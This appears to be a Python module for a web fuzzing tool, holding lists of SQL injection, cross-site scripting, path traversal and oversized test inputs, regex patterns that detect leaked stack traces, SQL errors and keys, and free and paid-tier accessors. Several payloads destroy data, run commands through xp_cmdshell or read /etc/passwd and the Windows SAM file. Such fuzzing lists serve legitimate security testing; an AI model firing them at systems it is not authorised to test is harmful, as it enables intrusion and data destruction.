"""FuzzGate payload library and information leak detection patterns."""

PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--", "admin'--",
        "1' ORDER BY 100--", "' OR ''='", "1; EXEC xp_cmdshell('id')--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg/onload=alert(1)>", "'\"><img src=x>",
        "{{7*7}}", "${7*7}", "<details/open/ontoggle=alert(1)>",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "/etc/passwd%00", "file:///etc/passwd", "..%252f..%252fetc/passwd",
    ],
    "integer_boundary": [
        0, -1, -2147483648, 2147483647, 9999999999999999,
        -9999999999999999, "NaN", "Infinity", "",
    ],
    "oversized": [
        "A" * 10000, "A" * 100000, "\x00" * 1000,
        "\xf0\x9f\x8e\xad" * 5000, "\n" * 10000,
        '{"a":' * 500 + '"b"' + "}" * 500,
    ],
}

LEAK_PATTERNS = {
    "stack_trace": r"(Traceback|at \w+\.\w+\(|Exception in thread|panic:)",
    "sql_error": r"(SQL syntax|mysql_|pg_query|ORA-\d{5}|SQLSTATE)",
    "internal_ip": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
    "path_disclosure": r"(/home/\w+|/var/www|/usr/local|C:\\Users)",
    "debug_info": r"(DEBUG|secret_key|api[_-]?key\s*[:=])",
}


def get_all_payloads():
    """Return all 5 payload categories (Pro tier)."""
    return dict(PAYLOADS)


def get_free_payloads():
    """Return free-tier payloads: sqli, xss, path_traversal only."""
    return {k: v for k, v in PAYLOADS.items() if k in ("sqli", "xss", "path_traversal")}
